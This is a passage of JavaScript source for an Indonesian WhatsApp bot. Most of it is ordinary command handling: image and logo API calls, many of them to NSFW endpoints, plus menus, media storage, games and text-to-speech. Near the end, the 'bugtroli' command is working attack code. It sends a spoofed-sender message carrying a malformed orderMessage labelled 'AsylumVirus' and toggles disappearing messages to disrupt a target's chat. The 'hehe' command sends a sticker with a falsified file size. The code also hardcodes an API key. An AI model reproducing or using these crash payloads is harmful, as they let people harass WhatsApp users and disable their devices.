                case 'yuri':
                case 'trap':
                case 'lewd':
                case 'feed':
                case 'eron':
                case 'solo':
                case 'gasm':
                case 'poke':
                case 'anal':
                case 'holo':
                case 'tits':
                case 'kuni':
                case 'kiss':
                case 'erok':
                case 'smug':
                case 'baka':
                case 'solog':
                case 'feetg':
                case 'lewdk':
                case 'waifu':
                case 'pussy':
                case 'femdom':
                case 'cuddle':
                case 'hentai':
                case 'eroyuri':
                case 'cum_jpg':
                case 'blowjob':
                case 'erofeet':
                case 'holoero':
                case 'classic':
                case 'erokemo':
                case 'fox_girl':
                case 'futanari':
                case 'lewdkemo':
                case 'wallpaper':
                case 'pussy_jpg':
                case 'kemonomimi':
                case 'nsfw_avatar':
                    getBuffer(`https://api.lolhuman.xyz/api/random2/${command}?apikey=${lolkey}`).then((gambar) => {
                        hexa.sendMessage(from, gambar, image, { quoted: ftoko })
                    })
                    break

                    // Textprome //
                case 'blackpink':
                case 'neon':
                case 'greenneon':
                case 'advanceglow':
                case 'futureneon':
                case 'sandwriting':
                case 'sandsummer':
                case 'sandengraved':
                case 'metaldark':
                case 'neonlight':
                case 'holographic':
                case 'text1917':
                case 'minion':
                case 'deluxesilver':
                case 'newyearcard':
                case 'bloodfrosted':
                case 'halloween':
                case 'jokerlogo':
                case 'fireworksparkle':
                case 'natureleaves':
                case 'bokeh':
                case 'toxic':
                case 'strawberry':
                case 'box3d':
                case 'roadwarning':
                case 'breakwall':
                case 'icecold':
                case 'luxury':
                case 'cloud':
                case 'summersand':
                case 'horrorblood':
                case 'thunder':
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    ini_txt = args.join(" ")
                    getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=${lolkey}&text=${ini_txt}`).then((gambar) => {
                        hexa.sendMessage(from, gambar, image, { quoted: ftoko })
                    })
                    break
                case 'pornhub':
                case 'glitch':
                case 'avenger':
                case 'space':
                case 'ninjalogo':
                case 'marvelstudio':
                case 'lionlogo':
                case 'wolflogo':
                case 'steel3d':
                case 'wallgravity':
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    txt1 = args[0]
                    txt2 = args[1]
                    getBuffer(`https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${lolkey}&text1=${txt1}&text2=${txt2}`).then((gambar) => {
                        hexa.sendMessage(from, gambar, image, { quoted: ftoko })
                    })
                    break

                    // Photo Oxy //
                case 'shadow':
                case 'cup':
                case 'cup1':
                case 'romance':
                case 'smoke':
                case 'burnpaper':
                case 'lovemessage':
                case 'undergrass':
                case 'love':
                case 'coffe':
                case 'woodheart':
                case 'woodenboard':
                case 'summer3d':
                case 'wolfmetal':
                case 'nature3d':
                case 'underwater':
                case 'golderrose':
                case 'summernature':
                case 'letterleaves':
                case 'glowingneon':
                case 'fallleaves':
                case 'flamming':
                case 'harrypotter':
                case 'carvedwood':
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    ini_txt = args.join(" ")
                    getBuffer(`https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${lolkey}&text=${ini_txt}`).then((gambar) => {
                        hexa.sendMessage(from, gambar, image, { quoted: ftoko })
                    })
                    break
                case 'tiktok':
                case 'arcade8bit':
                case 'battlefield4':
                case 'pubg':
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    txt1 = args[0]
                    txt2 = args[1]
                    getBuffer(`https://api.lolhuman.xyz/api/photooxy2/${command}?apikey=${lolkey}&text1=${txt1}&text2=${txt2}`).then((gambar) => {
                        hexa.sendMessage(from, gambar, image, { quoted: ftoko })
                    })
                    break

                    // Ephoto 360 //
                case 'wetglass':
                case 'multicolor3d':
                case 'watercolor':
                case 'luxurygold':
                case 'galaxywallpaper':
                case 'lighttext':
                case 'beautifulflower':
                case 'puppycute':
                case 'royaltext':
                case 'heartshaped':
                case 'birthdaycake':
                case 'galaxystyle':
                case 'hologram3d':
                case 'greenneon':
                case 'glossychrome':
                case 'greenbush':
                case 'metallogo':
                case 'noeltext':
                case 'glittergold':
                case 'textcake':
                case 'starsnight':
                case 'wooden3d':
                case 'textbyname':
                case 'writegalacy':
                case 'galaxybat':
                case 'snow3d':
                case 'birthdayday':
                case 'goldplaybutton':
                case 'silverplaybutton':
                case 'freefire':
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    ini_txt = args.join(" ")
                    getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${lolkey}&text=${ini_txt}`).then((gambar) => {
                        hexa.sendMessage(from, gambar, image, { quoted: ftoko })
                    })
                    break
        case 'cekapivhtear':
         y = await fetchJson(`https://api.vhtear.com/resultkey?apikey=${body.slice(12)}`)
         p = `Apikey Name: ${y.result.apikey} \nFrom: ${y.result.From} \n Expired: ${y.result.expired} \nStatus: ${y.result.status} \n DataLogApikey: ${y.result.dataapikey}`
         hexa.sendMessage(from, p, text, {quoted:ftoko})
         break
case '18+image':
 p = `  *[ 18+image ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}bj_
┣ ◩ _${prefix}ero_
┣ ◩ _${prefix}cum_
┣ ◩ _${prefix}feet_
┣ ◩ _${prefix}yuri_
┣ ◩ _${prefix}trap_
┣ ◩ _${prefix}lewd_
┣ ◩ _${prefix}feed_
┣ ◩ _${prefix}eron_
┣ ◩ _${prefix}solo_
┣ ◩ _${prefix}gasm_
┣ ◩ _${prefix}poke_
┣ ◩ _${prefix}anal_
┣ ◩ _${prefix}holo_
┣ ◩ _${prefix}tits_
┣ ◩ _${prefix}kuni_
┣ ◩ _${prefix}kiss_
┣ ◩ _${prefix}erok_
┣ ◩ _${prefix}smug_
┣ ◩ _${prefix}baka_
┣ ◩ _${prefix}solog_
┣ ◩ _${prefix}feetg_
┣ ◩ _${prefix}lewdk_
┣ ◩ _${prefix}waifu_
┣ ◩ _${prefix}pussy_
┣ ◩ _${prefix}femdom_
┣ ◩ _${prefix}cuddle_
┣ ◩ _${prefix}hentai_
┣ ◩ _${prefix}eroyuri_
┣ ◩ _${prefix}cum_jpg_
┣ ◩ _${prefix}blowjob_
┣ ◩ _${prefix}erofeet_
┣ ◩ _${prefix}holoero_
┣ ◩ _${prefix}classic_
┣ ◩ _${prefix}erokemo_
┣ ◩ _${prefix}fox_girl_
┣ ◩ _${prefix}futanari_
┣ ◩ _${prefix}lewdkemo_
┣ ◩ _${prefix}wallpaper_
┣ ◩ _${prefix}pussy_jpg_
┣ ◩ _${prefix}kemonomimi_
┣ ◩ _${prefix}nsfw_avatar_
┗━━━━━━━━ ❑`
                hexa.sendMessage(from, p, text, {quoted:ftoko})
                break
case '18+image2':
 p =`   *[ 18+image2 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}bj_
┣ ◩ _${prefix}ero_
┣ ◩ _${prefix}cum_
┣ ◩ _${prefix}feet_
┣ ◩ _${prefix}yuri_
┣ ◩ _${prefix}trap_
┣ ◩ _${prefix}lewd_
┣ ◩ _${prefix}feed_
┣ ◩ _${prefix}eron_
┣ ◩ _${prefix}solo_
┣ ◩ _${prefix}gasm_
┣ ◩ _${prefix}poke_
┣ ◩ _${prefix}anal_
┣ ◩ _${prefix}holo_
┣ ◩ _${prefix}tits_
┣ ◩ _${prefix}kuni_
┣ ◩ _${prefix}kiss_
┣ ◩ _${prefix}erok_
┣ ◩ _${prefix}smug_
┣ ◩ _${prefix}baka_
┣ ◩ _${prefix}solog_
┣ ◩ _${prefix}feetg_
┣ ◩ _${prefix}lewdk_
┣ ◩ _${prefix}waifu_
┣ ◩ _${prefix}pussy_
┣ ◩ _${prefix}femdom_
┣ ◩ _${prefix}cuddle_
┣ ◩ _${prefix}hentai_
┣ ◩ _${prefix}eroyuri_
┣ ◩ _${prefix}cum_jpg_
┣ ◩ _${prefix}blowjob_
┣ ◩ _${prefix}erofeet_
┣ ◩ _${prefix}holoero_
┣ ◩ _${prefix}classic_
┣ ◩ _${prefix}erokemo_
┣ ◩ _${prefix}fox_girl_
┣ ◩ _${prefix}futanari_
┣ ◩ _${prefix}lewdkemo_
┣ ◩ _${prefix}wallpaper_
┣ ◩ _${prefix}pussy_jpg_
┣ ◩ _${prefix}kemonomimi_
┣ ◩ _${prefix}nsfw_avatar_
┗━━━━━━━━ ❑`
hexa.sendMessage(from, p, text, {quoted:fvideo})
break

case 'textpro':
 p = `  *[ Text pro Menu ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}blackpink_
┣ ◩ _${prefix}neon_
┣ ◩ _${prefix}greenneon_
┣ ◩ _${prefix}advanceglow_
┣ ◩ _${prefix}futureneon_
┣ ◩ _${prefix}sandwriting_
┣ ◩ _${prefix}sandsummer_
┣ ◩ _${prefix}sandengraved_
┣ ◩ _${prefix}metaldark_
┣ ◩ _${prefix}neonlight_
┣ ◩ _${prefix}holographic_
┣ ◩ _${prefix}text1917_
┣ ◩ _${prefix}minion_
┣ ◩ _${prefix}deluxesilver_
┣ ◩ _${prefix}newyearcard_
┣ ◩ _${prefix}bloodfrosted_
┣ ◩ _${prefix}halloween_
┣ ◩ _${prefix}jokerlogo_
┣ ◩ _${prefix}fireworksparkle_
┣ ◩ _${prefix}natureleaves_
┣ ◩ _${prefix}bokeh_
┣ ◩ _${prefix}toxic_
┣ ◩ _${prefix}strawberry_
┣ ◩ _${prefix}box3d_
┣ ◩ _${prefix}roadwarning_
┣ ◩ _${prefix}breakwall_
┣ ◩ _${prefix}icecold_
┣ ◩ _${prefix}luxury_
┣ ◩ _${prefix}cloud_
┣ ◩ _${prefix}summersand_
┣ ◩ _${prefix}horrorblood_
┣ ◩ _${prefix}thunder_
┗━━━━━━━━ ❑`
hexa.sendMessage(from, p, text, {quoted:fvideo})
break

case 'cari':
 anu = await fetchJson(`https://myhuman.herokuapp.com/api/search/stickerpack?search=${body.slice(6)}`)
 y = `Title: ${anu.title} \nUsername: ${anu.username} \nThumb: ${anu.thumb} \nLimk: ${anu.link}`
 hexa.sendMessage(from, y, text, {quoted:fvideo})
 break
 case 'stickerwa2':
   y = await fetchJson(`https://myhuman.herokuapp.com/api/search/stickers?search=${body.slice(10)}`)
   buffer = y.result.sticker
   for ( var x of y) {
    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/convert/towebp?apikey=${lolkey}&img=${x}`)
    await hexa.sendMessage(from, buffer, sticker)
   }
   break
   case 'doaharian':
    get = await fetchJson(`https://myhuman.herokuapp.com/api/islam/alquran?search=${body.slice(11)}`)
    teks = `Nama doa: ${get.title} \nArab: ${get.arabic} \nArti: ${get.arti}`
    hexa.sendMessage(from, teks, text, {quoted:ftoko})
    break
    case 'jalantikus':
     yes = await fetchJson(`https://api.lolhuman.xyz/api/jalantikus?apikey=DestaPrasApi`)
     p = `Nama: ${yes.result.title} \nLink: ${yes.result.link} \nCategory: ${yes.result.category} \nTime: ${yes.result.time}`
     hexa.sendMessage(from, text, {ftroli,caption:p})
 break
 case 'ephoto360':
  p = `   *[ EPHOTO 360 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}blackpink_
┣ ◩ _${prefix}neon_
┣ ◩ _${prefix}greenneon_
┣ ◩ _${prefix}advanceglow_
┣ ◩ _${prefix}futureneon_
┣ ◩ _${prefix}sandwriting_
┣ ◩ _${prefix}sandsummer_
┣ ◩ _${prefix}sandengraved_
┣ ◩ _${prefix}metaldark_
┣ ◩ _${prefix}neonlight_
┣ ◩ _${prefix}holographic_
┣ ◩ _${prefix}text1917_
┣ ◩ _${prefix}minion_
┣ ◩ _${prefix}deluxesilver_
┣ ◩ _${prefix}newyearcard_
┣ ◩ _${prefix}bloodfrosted_
┣ ◩ _${prefix}halloween_
┣ ◩ _${prefix}jokerlogo_
┣ ◩ _${prefix}fireworksparkle_
┣ ◩ _${prefix}natureleaves_
┣ ◩ _${prefix}bokeh_
┣ ◩ _${prefix}toxic_
┣ ◩ _${prefix}strawberry_
┣ ◩ _${prefix}box3d_
┣ ◩ _${prefix}roadwarning_
┣ ◩ _${prefix}breakwall_
┣ ◩ _${prefix}icecold_
┣ ◩ _${prefix}luxury_
┣ ◩ _${prefix}cloud_
┣ ◩ _${prefix}summersand_
┣ ◩ _${prefix}horrorblood_
┣ ◩ _${prefix}thunder_
┗━━━━━━━━ ❑`
hexa.sendMessage(from, p, text, {quoted:fvideo})
break
case 'logomaker':
 p = `    *[ LOGO MAKER ]
┏━━━━━━━ ❒
┣ ◩ _${prefix}pornhub_
┣ ◩ _${prefix}glitch_
┣ ◩ _${prefix}avenger_
┣ ◩ _${prefix}space_
┣ ◩ _${prefix}ninjalogo_
┣ ◩ _${prefix}marvelstudio_
┣ ◩ _${prefix}lionlogo_
┣ ◩ _${prefix}wolflogo_
┣ ◩ _${prefix}steel3d_
┣ ◩ _${prefix}wallgravity_
┗━━━━━━━━ ❑`
hexa.sendMessage(from, p, text, {quoted:fvideo})
break

case 'textpro2':
 p = `    [ TEXT PRO 2 ]
┏━━━━━━━ ❒
┣ ◩ _${prefix}blackpink_
┣ ◩ _${prefix}neon_
┣ ◩ _${prefix}greenneon_
┣ ◩ _${prefix}advanceglow_
┣ ◩ _${prefix}futureneon_
┣ ◩ _${prefix}sandwriting_
┣ ◩ _${prefix}sandsummer_
┣ ◩ _${prefix}sandengraved_
┣ ◩ _${prefix}metaldark_
┣ ◩ _${prefix}neonlight_
┣ ◩ _${prefix}holographic_
┣ ◩ _${prefix}text1917_
┣ ◩ _${prefix}minion_
┣ ◩ _${prefix}deluxesilver_
┣ ◩ _${prefix}newyearcard_
┣ ◩ _${prefix}bloodfrosted_
┣ ◩ _${prefix}halloween_
┣ ◩ _${prefix}jokerlogo_
┣ ◩ _${prefix}fireworksparkle_
┣ ◩ _${prefix}natureleaves_
┣ ◩ _${prefix}bokeh_
┣ ◩ _${prefix}toxic_
┣ ◩ _${prefix}strawberry_
┣ ◩ _${prefix}box3d_
┣ ◩ _${prefix}roadwarning_
┣ ◩ _${prefix}breakwall_
┣ ◩ _${prefix}icecold_
┣ ◩ _${prefix}luxury_
┣ ◩ _${prefix}cloud_
┣ ◩ _${prefix}summersand_
┣ ◩ _${prefix}horrorblood_
┣ ◩ _${prefix}thunder_
┗━━━━━━━━ ❑`
hexa.sendMessage(from, p, text, {quoted:fvideo})
break
case 'hemlo':
 case 'fino':
const buttons = [
  {buttonId: `${prefix}kontolodon`, buttonText: {displayText: ' Ganteng '}, type: 1},
  {buttonId: `${prefix}kontolodon2`, buttonText: {displayText: 'Bacot'}, type: 1},
  {buttonId: `${prefix}kontolodon2`, buttonText: {displayText: 'Kontol'}, type: 1}
]

const buttonMessage = {
    contentText: "Fino ganteng ga?",
    footerText: 'pilih satu jing',
    buttons: buttons,
    headerType: 1
}

const sendMessage = await hexa.sendMessage(from, buttonMessage, MessageType.buttonsMessage)
break
case 'kontolodon':
 ler = `Makasih Sayang( buat cwe )`
 hexa.sendMessage(from, ler, text, {ftroli})
 break
 case 'kontolodon2':
  ler2 =`makasih anjg`
  hexa.sendMessage(from, ler2, text, {ftroli})
 break
case 'addvn':
				if (!isQuotedAudio) return reply('Reply vnnya')
				svst = body.slice(7)
				if (!svst) return reply('Nama audionya apa')
				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await hexa.downloadMediaMessage(boij)
				audionye.push(`${svst}`)
				fs.writeFileSync(`./database/audio/${svst}.mp3`, delb)
				fs.writeFileSync('./database/vn.json', JSON.stringify(audionye))
				hexa.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: mek })
				break
case 'addvid':
			  if (!isOwner) return reply(mess.only.ownerB)
				if (!isQuotedVideo) return reply('Reply videonya')
				svst = body.slice(8)
				if (!svst) return reply('Nama videonya')
				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await hexa.downloadMediaMessage(boij)
				videonye.push(`${svst}`)
				fs.writeFileSync(`./database/video/${svst}.mp4`, delb)
				fs.writeFileSync('./database/vid.json', JSON.stringify(videonye))
				hexa.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listvid`, MessageType.text, { quoted: fgclink })
				break

			case 'getvid':
				namastc = body.slice(8)
				try {
				buffer = fs.readFileSync(`./database/video/${namastc}.mp4`)
				hexa.sendMessage(from, buffer, video, { mimetype: 'video/mp4', quoted: mek })
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break

			case 'listvid':
				teks = '*List Video :*\n\n'
				for (let awokwkwk of videonye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${videonye.length}*\nGunakan perintah\n*${prefix}getvid (nama pack)*\nuntuk mengambil video`
				hexa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": videonye } })
				break

			case 'getvn':
				namastc = body.slice(7)
				try {
				buffer = fs.readFileSync(`./database/audio/${namastc}.mp3`)
				hexa.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: mek, ptt: false })
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break

			case 'listvn':
			case 'vnlist':
				teks = '*List Vn:*\n\n'
				for (let awokwkwk of audionye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${audionye.length}*\nGunakan perintah\n*${prefix}getvn (nama pack)*\nuntuk mengambil vn`
				hexa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": audionye } })
				break
			  case 'getstik':
				var itsme = `0@s.whatsapp.net`
				var split = `${cr}`
				var selepbot = {
					contextInfo: {
						participant: itsme,
						quotedMessage: {
							extendedTextMessage: {
								text: split,
							}
						}
					}
				}
				namastc = body.slice(9)
				try {
				result = fs.readFileSync(`./database/sticker/${namastc}.webp`)
				hexa.sendMessage(from, result, sticker, selepbot)
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break
			
			
			
			case 'liststik':
				teks = '*Sticker list :*\n\n'
				for (let awokwkwk of setiker) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${setiker.length}*\nGunakan perintah\n*${prefix}getstik (nama pack)*\nuntuk mengambil stiker`
				hexa.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
				break
			case 'addstik':
				if (!isQuotedSticker) return reply('Reply stiker nya')
				
				svst = body.slice(9)
				if (!svst) return reply('Nama sticker nya apa?')
				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await hexa.downloadMediaMessage(boij)
				setiker.push(`${svst}`)
				fs.writeFileSync(`./database/sticker/${svst}.webp`, delb)
				fs.writeFileSync('./database/stik.json', JSON.stringify(setiker))
				hexa.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`, MessageType.text, { quoted: mek })
				break
case 'addimg':
				if (!isQuotedImage) return reply('Reply imagenya')
				
				svst = body.slice(8)
				if (!svst) return reply('Nama imagenya apa')
				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await hexa.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./database/image/${svst}.jpeg`, delb)
				fs.writeFileSync('./database/img.json', JSON.stringify(imagenye))
				hexa.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listimage`, MessageType.text, { quoted: mek })
				break

			case 'getimg':
				namastc = body.slice(8)
				try {
				buffer = fs.readFileSync(`./database/image/${namastc}.jpeg`)
				hexa.sendMessage(from, buffer, image, { quoted: mek, caption: `Result From Database : ${namastc}.jpeg` })
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break
				
			case 'listimg':
				teks = '*List Image :*\n\n'
				for (let awokwkwk of imagenye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${imagenye.length}*\nGunakan perintah\n*${prefix}getimg (nama pack)*\nuntuk mengambil gambar`
				hexa.sendMessage(from, teks.trim(), extendedText, { quoted: ftoko, contextInfo: { "mentionedJid": imagenye } })
				break
case 'hehe':
			sendMessageFromContent(from, {
			"stickerMessage": {
			"url": "https://mmg.whatsapp.net/d/f/At57IFU4Afr0T7XC3vfpAyA2NltBMtQ7XJnn2VStMyJb.enc",
			"fileSha256": "9K8mbAOeuRKjHuWGsuP3kPN7Gx9qQwperPw65UXZK5A=",
			"fileEncSha256": "QKauUcHFrE+gwYaQJM2+8Ln2gZqZDkfTeDELzNKkTJc=",
			"mediaKey": "RnVLCUH+HVXSOMEb3pUkG8/tnAOrSDISqx7pb0428b0=",
			"mimetype": "image/webp",
			"height": 64,
			"width": 64,
			"directPath": "/v/t62.15575-24/31334621_284653730103320_3590805588541236326_n.enc?ccb=11-4&oh=b00d9aab957eb0cc6e9e8fcc7e107a15&oe=61225E26",
			"fileLength": "9999999999",
			"mediaKeyTimestamp": "1627040636",
			"isAnimated": false }
			})
			break
    case 'linkgc':
        
        
        linkgc = await hexa.groupInviteCode(from)
        reply('https://chat.whatsapp.com/'+linkgc)
                    break
case "revoke":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Bot not admin");
        if (!isGroup) return;
        hexa.revokeInvite(from);
        reply("```Succes revoke link group```");
        break;
     case 'linkgrup':
      case 'linkgroup':
              hexa.sendMessage(from, 'Sibukk!!')
               await sleep(1000)
               txtt =`Hai Kak ${pushname}\nPilih mode di bawah ini`
               buttonsMessage = [{buttonId: `${prefix}linkgc_`,buttonText:{displayText: '📌 Link group'},type:1},{buttonId:`${prefix}revoke`,buttonText:{displayText: '🔓 Reset link'},type:1}]
               buttonsMessage = { contentText: `${txtt}`, footerText: 'choose one', buttons: buttonsMessage, headerType: 1 }
               prep = await hexa.prepareMessageFromContent(from,{buttonsMessage},{})
               hexa.relayWAMessage(prep)
               break
case 'kodenegara':
hexa.sendMessage(from, negara(prefix, sender), text, {
  quoted: fvideo
})
break
//Case game
     case 'slot': 
			slot = `╔════════════════════\n`
		    slot += `║╭───────────[ *SLOT* ]───\n`
			slot += `║│➻ ${slot11} ║ ${slot22} ║ ${slot33}\n`
			slot += `║│➻ ${slot44} ║ ${slot55} ║ ${slot66} <====\n`
		    slot += `║│➻ ${slot77} ║ ${slot88} ║ ${slot99}	\n`			  				    
		    slot += `║│➻ GAME : SLOT [ *NEW* ]\n`
			slot += `║╰───────────────────\n`
			slot += `╚════════════════════\n`
			hexa.sendMessage(from, slot, text, {quoted: ftoko})
		    break
case 'xox':     
 case 'tictactoe':
                    oxz1 = `[ ${oxo11} ]\n`
                    oxz1 += `[ ${oxo22} ]\n`
                    oxz1 += `[ ${oxo33} ]\n`
                    reply(oxz1)
					break
		case 'pesan':
					if (!isGroup) return reply('GRUB ONLY')
				    if (args.length < 1) return reply(`[❗] CONTOHH??\n${prefix}${command}pesan @tagmember|halo kak`)
					var FG = body.slice(8)
					var F1 = FG.split("|")[0];
					var F2 = FG.split("|")[1];
					hexa.sendMessage(`${F1}@s.whatsapp.net`, `DARI ${pushname}\nPESAN : ${F2}`, text, {ftroli})
					reply('PESAN SUDAH TERKIRIM')
					break
//--google voice
				case 'tts':
					if (args.length < 1) return hexa.sendMessage(from, 'Kode bahasanya mana om?', text, {quoted: mek})
					const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return hexa.sendMessage(from, 'Textnya mana om', text, {quoted: mek})
					dtt = body.slice(8)
					ranm = getRandom('.mp3')
					dtt.length > 600
					? reply('Textnya kebanyakan om')
					: gtts.save(ranm, dtt, function() {
						hexa.sendMessage(from, fs.readFileSync(ranm), audio, {quoted: fvideo, mimetype: 'audio/mp4', ptt:true})
						fs.unlinkSync(ranm)
					})
					break
case 'tts2':
				    
				   if (args.length < 1) return hexa.sendMessage(from, 'Kode bahasanya mana om?', text, {quoted: mek})
					const tts = require('./lib/gtts')(args[0])
					if (args.length < 2) return hexa.sendMessage(from, 'Textnya mana om', text, {quoted: mek})
					dtt = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					dtt.length > 600
					? reply('Textnya kebanyakan om')
					: gtts.save(ranm, dtt, function() {
						exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
							fs.unlinkSync(ranm)
							buff = fs.readFileSync(rano)
							if (err) return reply('Gagal om:(')
							hexa.sendMessage(from, buff, audio, {quoted: mek, ptt:true})
							fs.unlinkSync(rano)
						})
					})
					break
					          case 'ghsearch': 
          case 'githubsearch': 
          case 'searchgithub':
              if (!q) return reply('Cari apa?')
              res = await fetch('https://api.github.com/search/repositories?q='+q)
              json = await res.json()
              if (res.status !== 200) throw json
              str = json.items.map((repo, index) => {
              return `
${1 + index}. *${repo.full_name}*${repo.fork ? ' (fork)' : ''}
_${repo.html_url}_
_Dibuat pada *${formatDate(repo.created_at)}*_
_Terakhir update pada *${formatDate(repo.updated_at)}*_
👁  ${repo.watchers}   🍴  ${repo.forks}   ⭐  ${repo.stargazers_count}
${repo.open_issues} Issue${repo.description ? `
*Deskripsi:*\n${repo.description}` : ''}
*Clone:* \`\`\`$ git clone ${repo.clone_url}\`\`\`
`.trim()
}).join('\n\n')
              reply(str)
              break
case 'bug':
        
              try {
              quotedText = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
              sendBug(from, `${quotedText}`)
              } catch {
              sendBug(from, `${q}`)
}
              break
          case 'wangy':
              if (!q) return
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              reply(awikwok)
              break
//--------------< Sticker Cmd >-------------------
case 'set':
	case 'setcmd':
	 case 'addcmd':
	  case 'cmdadd':
			if (isQuotedSticker) {
			if (!q) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
			var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
			addCmd(kodenya, q)
			reply(mess.sukses)
			} else {
			reply('```Mentione Sticker```')
			}
			break
		case 'delcmd':
			if (!isQuotedSticker) return reply(`Hmm`)
			var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
			scommand.splice(getCommandPosition(kodenya), 1)
			fs.writeFileSync("./database/scommand.json", JSON.stringify(scommand))
			reply(mess.sukses)
			break
		case 'listcmd': case 'cmd':
		
			let fino = `\`\`\`「 LIST STICKER CMD 」\`\`\``
			let cemde = [];
			for (let i of scommand) {
			cemde.push(i.id)
			fino += `\n\n ID :${i.id}\n Cmd : ${i.chats}`
			}
			reply(fino)
			break
			
case 'bugtroli':
              
     function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
hexa.sendMessage(nomor, `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
    orderMessage: {
    thumbnail: fs.readFileSync('./stik/thumb.jpeg'),
    itemCount: -969769349, // Bug
    status: 1,
    surface: 1,
    message: '☠️Asylum☠️',
    orderTitle: 'AsylumVirus', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
hexa.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}	
async function attack(targett){
bug(targett)
await sleep(100)
troli(targett)
await sleep(100)
bug(targett)
}

attack(mek.key.remoteJid)
break
case 'bugtroli2':

if (args.length < 1) return reply('Jumlahnya?')
		        try {
